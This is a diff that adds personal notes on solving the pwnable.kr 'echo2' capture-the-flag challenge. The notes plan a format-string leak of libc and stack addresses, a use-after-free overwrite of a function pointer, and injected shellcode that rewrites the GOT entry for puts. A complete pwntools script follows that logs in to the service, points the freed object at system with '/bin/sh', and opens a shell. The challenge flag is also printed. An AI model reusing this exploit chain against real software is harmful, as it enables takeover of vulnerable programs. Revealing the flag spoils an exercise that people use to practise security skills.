@@ -241,6 +241,154 @@ Note that apparently free scrambles some memory at whatever pointer is given as 
 to find another way, the tools i have at my disposial now is i can go to any piece of code i want now but i can't give that piece of code arguments. Can i call the get_input
 function with a size value of something higher than 32???
 
+I can insert shellcode into the initial buffer in main (aslong as there are no whitespace characters and such in the instruction) which then can handle the call to system maybe?
+
+Ok found a potential solution that i think can work
+
+1. put shellcode on the initial buffer that stores my name in main which will replace the got entry for puts with the address of the start of echo2 right before the call to
+the formalities greeting member
+
+2. use format string vulnerabilities to leak the address of the system function, and to also leak the address of the before mentioned buffer inside of main with the shell code
+
+3. fake exit the program to initialize the freeing of the o variable
+
+4. call echo2 and overwrite o's greeting method with the shellcode in the main buffer
+
+5. call echo2 again which will execute said shellcode and replace puts got entry with the start of echo2, after this is done proceed to put /bin/sh in place of the name member
+and the address of system in place of the greeting member function for the o variable, we will go back to the start of the function on executing of the puts call, then
+we will loop back to the greeting call with the proper argument and function overwrite :)
+
+6. get shell access and cat flag
+
+found address on stack 0x7fffffffea20 while start of buffer is at 0x7fffffffea00 so just subtract 0x7fffffffea20 by 0x20 = 32 and we get location of buffer
+
+%p%p%p%p%p%p%p%p%p aa %p aaaaaaa
+
+seems to work for this task, just isolate address that is surrounded by a's then minus by 32 and we get address of buffer probably
+
+insert the following shellcode...
+
+push rbp
+mov rbp, rsp
+mov QWORD PTR [0x602008], 0x400828
+leave
+ret
+
+where 0x602008 is address of got of puts and 0x400828 is address of echo2, compiling this into shellcode we get...
+
+55 48 89 E5 48 C7 04 25 08 20 60 00 28 08 40 00 C9 C3 
+
+which has a 20 in it because of the address of plt got, HAHAHAHAHAHAHHAHAHAHHAHAHAHAHAHHAHA
+quick fix???
+
+push rbp
+mov rbp, rsp
+mov rax, 0x601008
+mov QWORD PTR 0X1000[rax], 0x400828
+leave
+ret
+
+with shell code
+
+55 48 89 E5 48 C7 C0 08 10 60 00 48 C7 80 00 10 00 00 28 08 40 00 C9 C3
+
+which has 24 bytes exactly, problem is scanf adds null terminator and buffer is size 24, can fix this by doing...
+
+mov rax, 0x601008
+mov QWORD PTR 0X1000[rax], 0x400828
+ret
+
+which compiles as...
+
+48 C7 C0 08 10 60 00 48 C7 80 00 10 00 00 28 08 40 00 C3
+48C7C00810600048C7800010000028084000C3
+
+which should be sufficient,
+finished, flag is "w3_want_ex3cutable_5tack", worked with script...
+
+##################################################
+from pwn import *
+import os
+import re
+import sys
+
+io = None
+ssh_connection = ssh(user="echo2", host='pwnable.kr', port=2222, password="guest")
+if (len(sys.argv) > 1 and sys.argv[1] == "debug"):
+    io = ssh_connection.process(["./echo2"])
+    gdb.attach(io, """
+    break echo3
+    """)
+else:
+    io = ssh_connection.remote('localhost', 9011)
+
+shellcode = b"\x48\xC7\xC0\x08\x10\x60\x00\x48\xC7\x80\x00\x10\x00\x00\x28\x08\x40\x00\xC3\n"
+io.sendafter(b": ", shellcode)
+io.recvuntil(b'> ')
+
+puts_offset = 0x080e50
+system_offset = 0x050d70
+
+io.send(b"2\n")
+payload = b"%p%p%p%p%p%p%p%p%saaaaaa\x08\x20\x60\x00\x00\x00\x00\n" # should end with a null byte
+
+io.recvuntil(b'\n')
+io.send(payload)
+
+answer = io.recvuntil(b'\n')
+print(answer)
+puts_address = re.findall(b"7325[^a]*aaa", answer)[0]
+puts_address = puts_address[4:len(puts_address)-3]
+puts_address = puts_address[::-1].hex()
+puts_address = int(puts_address, 16)
+libc_base = puts_address - puts_offset
+system_address = libc_base + system_offset
+print("system address is:", hex(system_address))
+
+print(io.recvuntil(b"> "))
+io.send(b'2\n')
+print(io.recvuntil(b'\n'))
+payload = b'%p%p%p%p%p%p%p%p%p aa %p aaaaaa\n'
+io.send(payload)
+answer = io.recvuntil(b'\n')
+print("answer is:", answer)
+main_buffer = re.findall(b"a .* a", answer)[0]
+main_buffer = main_buffer[2:len(main_buffer) - 2]
+main_buffer = int(main_buffer, 16)
+main_buffer = main_buffer - 0x20
+print("main buffer is:", hex(main_buffer))
+
+
+io.send(b'4\n')
+print(io.recvuntil(b'(y/n)'))
+print()
+io.send(b'n\n')
+print("here:", io.recvuntil(b'> '))
+print()
+io.send(b"3\n")
+print(io.recvuntil(b'\n'))
+print()
+print("p64 main buffer is:", p64(main_buffer))
+payload = b'\0'*24 + p64(main_buffer)
+payload = payload[0:len(payload) - 1] + b"\n" # add newline at the end (thisll be replaced by null byte so it's fine)
+io.send(payload)
+print(io.recvuntil(b'\n'))
+print()
+print(io.recvuntil(b'> '))
+print()
+io.send(b"3\n")
+print()
+payload = b'/bin/sh\0' + b'\0'*16 + p64(system_address) + b'\n'
+io.send(payload)
+io.interactive()
+
+
+
+io.close()
+##################################################
+though this is really messy since i have no experience with pwntools and has alot of debugging prints, will clean this up for practice with pwntools and make it more pleasant
+to look at
+
 
 
 
